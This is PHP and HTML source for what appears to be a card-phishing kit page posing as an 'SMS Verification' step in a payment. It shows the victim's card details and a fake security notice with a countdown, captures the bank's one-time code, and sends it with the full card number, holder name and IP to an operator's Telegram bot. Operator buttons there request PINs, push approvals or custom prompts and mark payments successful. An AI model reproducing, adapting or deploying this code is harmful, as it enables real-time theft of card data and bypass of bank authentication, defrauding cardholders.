<?php
require_once 'config.php';

// Get session ID from URL
$sessionId = $_GET['session'] ?? '';
if (!preg_match('/^[a-f0-9]{32}$/', $sessionId)) {
    die('Invalid session ID');
}

$sessionFile = SESSIONS_DIR . '/' . $sessionId . '.json';
if (!file_exists($sessionFile)) {
    die('Session not found');
}

// Read session data
$sessionData = json_decode(file_get_contents($sessionFile), true);
$cardData = $sessionData['card_data'];

// Check if card is blocked
if (isCardBlocked($cardData['number'])) {
    die('This card has been blocked. Please use another payment method.');
}

// Check for error parameter from incorrect verification
$error = null;
if (isset($_GET['error']) && $_GET['error'] === 'incorrect') {
    $error = 'The verification code you entered is incorrect. Please try again.';
}

// Process SMS form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $smsCode = preg_replace('/[^0-9]/', '', $_POST['sms_code'] ?? '');
    
    if (empty($smsCode) || strlen($smsCode) < 6) {
        $error = 'Please enter a valid 6-digit SMS code';
    } else {
        // Send SMS code to Telegram
        $formattedCardNumber = implode(' ', str_split($cardData['number'], 4));
        
        $messageText = "📲 *SMS Code Received*\n\n";
        $messageText .= "💳 Card: `" . $formattedCardNumber . "`\n";
        $messageText .= "📞 Code: `$smsCode`\n";
        $messageText .= "👤 Holder: `{$cardData['holder']}`\n";
        $messageText .= "IP: `{$cardData['ip']}`\n";
        $messageText .= "Session: `$sessionId`";
        
        // Create verification buttons WITH ALL ACTION BUTTONS
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '✅ Correct', 'callback_data' => "verify:$sessionId:sms:correct:$smsCode"],
                    ['text' => '❌ Incorrect', 'callback_data' => "verify:$sessionId:sms:incorrect:$smsCode"]
                ],
                [
                    ['text' => '📲 SMS', 'callback_data' => "action:sms:$sessionId"],
                    ['text' => '📱 PUSH', 'callback_data' => "action:push:$sessionId"]
                ],
                [
                    ['text' => '🔑 PIN', 'callback_data' => "action:pin:$sessionId"],
                    ['text' => '💬 Custom', 'callback_data' => "action:custom:$sessionId"]
                ],
                [
                    ['text' => '🚫 Block Card', 'callback_data' => "action:block:$sessionId"]
                ],
                [
                    ['text' => '✅ Successful payment', 'callback_data' => "action:payment_success:$sessionId"],
                    ['text' => '❌ Payment failed', 'callback_data' => "action:payment_failed:$sessionId"]
                ]
            ]
        ];
        
        // Send to Telegram WITH ALL BUTTONS
        $telegramUrl = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
        $postData = [
            'chat_id' => ADMIN_CHAT_ID,
            'text' => $messageText,
            'parse_mode' => 'Markdown',
            'reply_markup' => json_encode($keyboard)
        ];
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $telegramUrl,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $postData,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10
        ]);
        
        $result = curl_exec($ch);
        curl_close($ch);
        
        // Update session
        $sessionData['sms_code'] = $smsCode;
        $sessionData['sms_submitted_at'] = time();
        file_put_contents($sessionFile, json_encode($sessionData, JSON_PRETTY_PRINT));
        
        header("Location: waiting.php?session=$sessionId");
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Verification</title>
    <style>
        :root {
            --primary: #6772e5;
            --primary-hover: #5469d4;
            --error: #e25950;
            --success: #28a745;
            --border: #e1e1e8;
            --text: #32325d;
            --text-light: #6b7c93;
            --bg: #f6f9fc;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: var(--text);
            line-height: 1.5;
            -webkit-font-smoothing: antialiased;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .sms-container {
            max-width: 480px;
            width: 100%;
        }
        
        .glass-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        
        .header-section {
            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-hover) 100%);
            color: white;
            padding: 40px 30px;
            text-align: center;
        }
        
        .header-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }
        
        .header-title {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .header-subtitle {
            font-size: 16px;
            opacity: 0.9;
        }
        
        .content-section {
            padding: 40px 30px;
        }
        
        .card-preview {
            background: rgba(103, 114, 229, 0.1);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 30px;
            text-align: center;
            border: 1px solid rgba(103, 114, 229, 0.2);
        }
        
        .card-number {
            font-size: 18px;
            font-weight: 600;
            color: var(--primary);
            margin-bottom: 8px;
            letter-spacing: 1px;
        }
        
        .card-info {
            font-size: 14px;
            color: var(--text-light);
        }
        
        .code-input-section {
            margin-bottom: 30px;
        }
        
        .code-label {
            display: block;
            text-align: center;
            margin-bottom: 20px;
            font-size: 16px;
            color: var(--text);
            font-weight: 500;
        }
        
        .code-inputs {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 15px;
        }
        
        .code-input {
            width: 50px;
            height: 60px;
            text-align: center;
            font-size: 24px;
            font-weight: 600;
            border: 2px solid var(--border);
            border-radius: 12px;
            background: white;
            transition: all 0.3s ease;
            color: var(--text);
        }
        
        .code-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(103, 114, 229, 0.1);
            transform: translateY(-2px);
        }
        
        .code-input.filled {
            border-color: var(--success);
            background: rgba(40, 167, 69, 0.05);
        }
        
        .code-hint {
            text-align: center;
            font-size: 14px;
            color: var(--text-light);
        }
        
        .submit-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-hover) 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 20px;
        }
        
        .submit-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(103, 114, 229, 0.4);
        }
        
        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .security-notice {
            background: rgba(248, 249, 250, 0.8);
            border-radius: 12px;
            padding: 20px;
            font-size: 14px;
            color: var(--text-light);
            text-align: center;
            border-left: 4px solid var(--primary);
        }
        
        .timer {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: var(--text-light);
        }
        
        .countdown {
            font-weight: 600;
            color: var(--primary);
        }
        
        .error-message {
            background: rgba(226, 89, 80, 0.15);
            border: 2px solid var(--error);
            border-radius: 12px;
            padding: 18px 20px;
            margin-bottom: 25px;
            text-align: center;
            color: var(--error);
            font-size: 15px;
            font-weight: 600;
            box-shadow: 0 2px 8px rgba(226, 89, 80, 0.2);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .error-message::before {
            content: "⚠️";
            font-size: 20px;
        }
        
        @media (max-width: 480px) {
            body {
                padding: 15px;
            }
            
            .header-section {
                padding: 30px 20px;
            }
            
            .content-section {
                padding: 30px 20px;
            }
            
            .code-inputs {
                gap: 8px;
            }
            
            .code-input {
                width: 45px;
                height: 55px;
                font-size: 22px;
            }
            
            .header-title {
                font-size: 24px;
            }
        }
        
        /* Animation for completed code */
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
            40% {transform: translateY(-5px);}
            60% {transform: translateY(-3px);}
        }
        
        .code-input.completed {
            animation: bounce 0.6s ease;
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
        }
        
        .loading-overlay.active {
            opacity: 1;
            visibility: visible;
        }
        
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="sms-container">
        <div class="glass-card">
            <div class="header-section">
                <div class="header-icon">📱</div>
                <h1 class="header-title">SMS Verification</h1>
                <p class="header-subtitle">Enter the 6-digit code sent to your phone</p>
            </div>
            
            <div class="content-section">
                <?php if (isset($error)): ?>
                    <div class="error-message"><?= $error ?></div>
                <?php endif; ?>
                
                <div class="card-preview">
                    <div class="card-number">
                        **** **** **** <?= substr($cardData['number'], -4) ?>
                    </div>
                    <div class="card-info">
                        <?= $cardData['holder'] ?> • Expires <?= $cardData['expiry'] ?>
                    </div>
                </div>
                
                <form method="POST" action="sms.php?session=<?= $sessionId ?>" id="sms-form">
                    <div class="code-input-section">
                        <label class="code-label">Enter verification code</label>
                        <div class="code-inputs">
                            <input type="text" inputmode="numeric" pattern="[0-9]*" class="code-input" maxlength="1" data-index="1" autocomplete="off">
                            <input type="text" inputmode="numeric" pattern="[0-9]*" class="code-input" maxlength="1" data-index="2" autocomplete="off">
                            <input type="text" inputmode="numeric" pattern="[0-9]*" class="code-input" maxlength="1" data-index="3" autocomplete="off">
                            <input type="text" inputmode="numeric" pattern="[0-9]*" class="code-input" maxlength="1" data-index="4" autocomplete="off">
                            <input type="text" inputmode="numeric" pattern="[0-9]*" class="code-input" maxlength="1" data-index="5" autocomplete="off">
                            <input type="text" inputmode="numeric" pattern="[0-9]*" class="code-input" maxlength="1" data-index="6" autocomplete="off">
                        </div>
                        <input type="hidden" name="sms_code" id="sms-code">
                        <div class="code-hint">Type the 6-digit code from your SMS message</div>
                    </div>
                    
                    <button type="submit" class="submit-btn" id="submit-btn" disabled>
                        Verify Code
                    </button>
                </form>
                
                <div class="security-notice">
                    <strong>Security Notice:</strong> For your protection, we've sent a verification code to the phone number associated with your card.
                </div>
                
                <div class="timer">
                    Code expires in: <span class="countdown" id="countdown">05:00</span>
                </div>
            </div>
        </div>
    </div>

    <div class="loading-overlay" id="loading-overlay">
        <div class="loading-spinner"></div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const codeInputs = document.querySelectorAll('.code-input');
            const hiddenInput = document.getElementById('sms-code');
            const submitBtn = document.getElementById('submit-btn');
            const form = document.getElementById('sms-form');
            const loadingOverlay = document.getElementById('loading-overlay');
            let countdown = 300; // 5 minutes in seconds
            
            // Focus on first input
            codeInputs[0].focus();
            
            // Start countdown timer
            startCountdown();
            
            // Handle code input
            codeInputs.forEach((input, index) => {
                input.addEventListener('input', function(e) {
                    const value = this.value;
                    
                    // Only allow numbers
                    if (!/^\d*$/.test(value)) {
                        this.value = '';
                        return;
                    }
                    
                    if (value.length === 1) {
                        this.classList.add('filled');
                        
                        // Move to next input if available
                        if (index < codeInputs.length - 1) {
                            codeInputs[index + 1].focus();
                        }
                        
                        // Check if all inputs are filled
                        checkCodeCompletion();
                    }
                });
                
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && this.value === '') {
                        // Move to previous input on backspace
                        if (index > 0) {
                            codeInputs[index - 1].focus();
                            codeInputs[index - 1].value = '';
                            codeInputs[index - 1].classList.remove('filled');
                            checkCodeCompletion();
                        }
                    }
                    
                    // Allow navigation with arrow keys
                    if (e.key === 'ArrowLeft' && index > 0) {
                        codeInputs[index - 1].focus();
                    }
                    
                    if (e.key === 'ArrowRight' && index < codeInputs.length - 1) {
                        codeInputs[index + 1].focus();
                    }
                });
                
                input.addEventListener('paste', function(e) {
                    e.preventDefault();
                    
                    // Get pasted data and extract only digits
                    const pasteData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
                    
                    if (pasteData.length > 0) {
                        // Fill all inputs with pasted data
                        codeInputs.forEach((input, i) => {
                            if (i < pasteData.length) {
                                input.value = pasteData[i];
                                input.classList.add('filled');
                            } else {
                                input.value = '';
                                input.classList.remove('filled');
                            }
                        });
                        
                        // Focus on last filled input or last input
                        const focusIndex = Math.min(pasteData.length - 1, codeInputs.length - 1);
                        codeInputs[focusIndex].focus();
                        
                        // Trigger check immediately
                        checkCodeCompletion();
                    }
                });
            });
            
            function checkCodeCompletion() {
                const code = Array.from(codeInputs).map(input => input.value).join('');
                hiddenInput.value = code;
                
                if (code.length === 6) {
                    submitBtn.disabled = false;
                    
                    // Add completion animation
                    codeInputs.forEach(input => {
                        input.classList.add('completed');
                    });
                    
                    // Auto-submit after short delay
                    setTimeout(() => {
                        showLoading();
                        form.submit();
                    }, 800);
                } else {
                    submitBtn.disabled = true;
                    codeInputs.forEach(input => {
                        input.classList.remove('completed');
                    });
                }
            }
            
            function showLoading() {
                loadingOverlay.classList.add('active');
            }
            
            function startCountdown() {
                const countdownElement = document.getElementById('countdown');
                
                const timer = setInterval(function() {
                    const minutes = Math.floor(countdown / 60);
                    const seconds = countdown % 60;
                    
                    countdownElement.textContent = 
                        minutes.toString().padStart(2, '0') + ':' + 
                        seconds.toString().padStart(2, '0');
                    
                    if (countdown <= 60) {
                        countdownElement.style.color = 'var(--error)';
                    }
                    
                    if (countdown <= 0) {
                        clearInterval(timer);
                        countdownElement.textContent = '00:00';
                        
                        // Disable form
                        codeInputs.forEach(input => {
                            input.disabled = true;
                            input.placeholder = '×';
                        });
                        
                        submitBtn.disabled = true;
                        submitBtn.textContent = 'Code Expired';
                        submitBtn.style.background = 'var(--error)';
                    }
                    
                    countdown--;
                }, 1000);
            }
            
            // Manual form submission handler
            form.addEventListener('submit', function(e) {
                const code = hiddenInput.value;
                if (code.length !== 6) {
                    e.preventDefault();
                    return;
                }
                showLoading();
            });
            
            // Prevent form resubmission
            if (window.history.replaceState) {
                window.history.replaceState(null, null, window.location.href);
            }
        });
    </script>
</body>
</html>